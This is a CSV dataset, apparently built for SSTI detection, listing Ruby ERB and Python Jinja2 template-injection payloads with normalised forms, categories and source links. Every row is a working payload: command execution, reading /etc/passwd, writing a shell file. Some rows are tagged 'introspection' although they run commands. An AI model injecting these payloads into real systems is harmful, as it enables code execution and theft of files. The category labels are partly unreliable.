"<%= open(""|env"").read %>","<%=open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x[id] %>,<%=%x[id]%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x|id| %>,<%=%x|id|%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x(id) %>,<%=%x(id)%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x<id> %>,<%=%x<id>%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Kernel.%x(id) %>,<%=kernel.%x(id)%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Process.spawn(""id"") %>","<%=process.spawn(""S"")%>",ruby,ERB,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Process.exec(""id"") %>","<%=process.exec(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Process.daemon %>,<%=process.daemon%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= spawn(""id"") %>","<%=spawn(""S"")%>",ruby,ERB,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= fork{system(""id"")} %>","<%=fork{system(""S"")}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.write(""shell.rb"",""system('id')"") %>","<%=io.write(""S"",""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.write(""shell.rb"",""system('id')"") %>","<%=file.write(""S"",""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.open(""shell.rb"",""w"").write(""system('id')"") %>","<%=file.open(""S"",""S"").write(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= File.binwrite(""shell.rb"",""system('id')"") %>","<%=file.binwrite(""S"",""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""system('id')"".instance_eval %>","<%=""S"".instance_eval%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""File.read('/etc/passwd')"".instance_eval %>","<%=""S"".instance_eval%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= self.instance_eval(""system('id')"") %>","<%=self.instance_eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= self.class_eval(""system('id')"") %>","<%=self.class_eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= self.module_eval(""system('id')"") %>","<%=self.module_eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= binding.eval(""system('id')"") %>","<%=binding.eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= binding.pry %>,<%=binding.pry%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= binding.irb %>,<%=binding.irb%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""'id'.tap{|x|system(x)}"") %>","<%=eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""id"".tap{|x|system(x)} %>","<%=""S"".tap{|x|system(x)}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].each{|x|system(x)} %>","<%=[""S""].each{|x|system(x)}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].map{|x|system(x)} %>","<%=[""S""].map{|x|system(x)}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].select{|x|system(x)} %>","<%=[""S""].select{|x|system(x)}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].find{|x|system(x)} %>","<%=[""S""].find{|x|system(x)}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].detect{|x|system(x)} %>","<%=[""S""].detect{|x|system(x)}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].inject{|x|system(x)} %>","<%=[""S""].inject{|x|system(x)}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [""id""].reduce{|x|system(x)} %>","<%=[""S""].reduce{|x|system(x)}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= 1.times{system(""id"")} %>","<%=N.times{system(""S"")}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= loop{system(""id"");break} %>","<%=loop{system(""S"");break}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Pathname.new(""/etc/passwd"").read %>","<%=pathname.new(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Pathname.new(""/"").entries %>","<%=pathname.new(""S"").entries%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Pathname.new(""."").glob(""*"") %>","<%=pathname.new(""S"").glob(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Shellwords.escape(""id"") %>","<%=shellwords.escape(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Shellwords.split(""id"") %>","<%=shellwords.split(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= URI.open(""|id"").read %>","<%=uri.open(""S"").read%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Etc.getlogin %>,<%=etc.getlogin%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Etc.getpwnam(""root"") %>","<%=etc.getpwnam(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= Etc.passwd %>,<%=etc.passwd%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ERB.new(""<%=system('id')%>"").result %>","<%=erb.new(""S"").result%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ERB.new(""<%=`id`%>"").result %>","<%=erb.new(""S"").result%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ERB.new(""<%=File.read('/etc/passwd')%>"").result %>","<%=erb.new(""S"").result%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= TOPLEVEL_BINDING.eval(""system('id')"") %>","<%=toplevel_binding.eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= TOPLEVEL_BINDING.eval(""`id`"") %>","<%=toplevel_binding.eval(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= TOPLEVEL_BINDING.eval(""File.read('/etc/passwd')"") %>","<%=toplevel_binding.eval(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= BasicObject.new.instance_eval{system(""id"")} %>","<%=basicobject.new.instance_eval{system(""S"")}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Class.new.class_eval{system(""id"")} %>","<%=class.new.class_eval{system(""S"")}%>",ruby,ERB,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Module.new.module_eval{system(""id"")} %>","<%=module.new.module_eval{system(""S"")}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= [].instance_eval{system(""id"")} %>","<%=[].instance_eval{system(""S"")}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= """".instance_eval{system(""id"")} %>","<%=""S"".instance_eval{system(""S"")}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= {}.instance_eval{system(""id"")} %>","<%={}.instance_eval{system(""S"")}%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= Marshal.load(Marshal.dump(system(""id""))) %>","<%=marshal.load(marshal.dump(system(""S"")))%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= YAML.load(""--- !ruby/object:Gem::Installer\ni: x\n"") %>","<%=yaml.load(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= YAML.load(""--- !ruby/object:Gem::Requirement\nrequirements: !ruby/object:Gem::Package::TarReader\nio: &1 !ruby/object:Net::BufferedIO\nio: &1 !ruby/object:Gem::Package::TarReader::Entry\nread: 0\nheader: \""abc\""\n@io: *1\n"") %>","<%=yaml.load(""S""abc\""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= `#{""id""}` %>","<%=`#{""S""}`%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""#{""id""}"") %>","<%=system(""S""id""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= eval(""#{""system('id')""}"") %>","<%=eval(""S""system('S')""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= IO.popen(""#{""id""}"").read %>","<%=io.popen(""S""id""S"").read%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= %x{#{""id""}} %>","<%=%x{#{""S""}}%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= %x{cat${IFS}/etc/passwd} %>,<%=%x{cat${ifs}/etc/passwd}%>,ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat${IFS}/etc/passwd"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat$IFS/etc/passwd` %>,<%=`cat$ifs/etc/passwd`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat</etc/passwd"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
<%= `cat<flag.txt` %>,<%=`cat<flag.txt`%>,ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= system(""cat<flag.txt"") %>","<%=system(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= ""\x73\x79\x73\x74\x65\x6d"".to_sym.to_proc.call(""id"") %>","<%=""S"".to_sym.to_proc.call(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= :system.to_proc.call(""id"") %>","<%=:system.to_proc.call(""S"")%>",ruby,ERB,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= :exec.to_proc.call(""id"") %>","<%=:exec.to_proc.call(""S"")%>",ruby,ERB,1,high,direct-execution,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
"<%= :eval.to_proc.call(""system('id')"") %>","<%=:eval.to_proc.call(""S"")%>",ruby,ERB,1,high,direct-execution,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/erb-ruby.txt
{{request}},{{request}},python,Jinja2,1,high,enumeration,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__}},{{'S'.__class__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__}},{{[].__class__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{{}.__class__}},{{{}.__class__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.join}},{{'S'.join}},python,Jinja2,1,high,uncertain,no,manual_review_pending (2026-09-17 payload-type flag),https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.environ}},{{request.environ}},python,Jinja2,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.application}},{{request.application}},python,Jinja2,1,high,enumeration,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{get_flashed_messages.__globals__}},{{get_flashed_messages.__globals__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{lipsum.__globals__}},{{lipsum.__globals__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{cycler.__init__.__globals__}},{{cycler.__init__.__globals__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{joiner.__init__.__globals__}},{{joiner.__init__.__globals__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{namespace.__init__.__globals__}},{{namespace.__init__.__globals__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__}},{{'S'.__class__.__mro__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__mro__}},{{[].__class__.__mro__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{{}.__class__.__mro__}},{{{}.__class__.__mro__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1]}},{{'S'.__class__.__mro__[N]}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[2]}},{{'S'.__class__.__mro__[N]}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__}},{{[].__class__.__base__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{{}.__class__.__base__}},{{{}.__class__.__base__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__base__}},{{'S'.__class__.__base__}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()}},{{'S'.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{[].__class__.__base__.__subclasses__()}},{{[].__class__.__base__.__subclasses__()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{{}.__class__.__base__.__subclasses__()}},{{{}.__class__.__base__.__subclasses__()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
"{%for c in [].__class__.__base__.__subclasses__()%}{{c.__name__}},{%endfor%}","{%forcin[].__class__.__base__.__subclasses__()%}{{c.__name__}},{%endfor%}",python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[2].__subclasses__()}},{{'S'.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__.__mro__[1].__subclasses__()}},{{request.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__.__mro__[8].__subclasses__()}},{{request.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{request.__class__.__mro__[9].__subclasses__()}},{{request.__class__.__mro__[N].__subclasses__()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read()}},{{self._templatereference__context.joiner.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}},{{self._templatereference__context.namespace.__init__.__globals__.os.popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{config.__class__.__init__.__globals__['os'].popen('id').read()}},{{config.__class__.__init__.__globals__['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N]('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__.__builtins__['S']('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('id').read()}},{{'S'.__class__.__mro__[N].__subclasses__()[N].__init__.__globals__['S'].modules['S'].popen('S').read()}},python,Jinja2,1,high,introspection,no,,https://github.com/payload-box/ssti-advanced-payload-list/blob/957fb1fab4ded0f1f38e57f4e6c5b388698e501a/Intruder/jinja2-flask.txt
